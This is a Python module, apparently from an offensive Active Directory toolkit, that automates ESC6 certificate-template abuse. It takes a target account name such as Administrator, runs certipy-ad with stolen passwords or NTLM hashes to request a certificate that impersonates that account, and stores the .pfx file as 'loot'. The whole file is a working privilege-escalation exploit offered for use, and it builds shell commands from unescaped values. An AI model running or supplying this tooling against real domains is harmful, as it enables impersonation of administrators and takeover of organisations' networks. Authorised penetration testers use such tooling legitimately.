# modules/adcs/esc6.py

import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc6(session, template):
    print(blue(f"[*] Starting ESC6 Abuse using template: {template}"))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] Invalid CA name in session metadata."))
        return

    # Step 1: Ask target UPN to impersonate
    target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
    if not target_upn or "@" not in target_upn:
        print(red("[-] Invalid UPN format."))
        return

    output_file = f"esc6_{target_upn.split('@')[0]}.pfx"

    # Step 2: Build certipy-ad command
    if session.hash:
        auth = f"-u {session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"-u {session.username} -p '{session.password}'"

    cmd = (
        f"certipy-ad req {auth} "
        f"-dc-ip {session.dc_ip} -ca '{ca_name}' "
        f"-template '{template}' -upn '{target_upn}' -out {output_file}"
    )

    print(blue(f"[*] Requesting certificate impersonating {target_upn} using SAN override..."))
    out, err = run_command(cmd)
    print(out)
    if err:
        print(red(err.strip()))

    # Step 3: Check if file created
    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"))
    else:
        print(red("[-] Certificate request failed or file not created."))
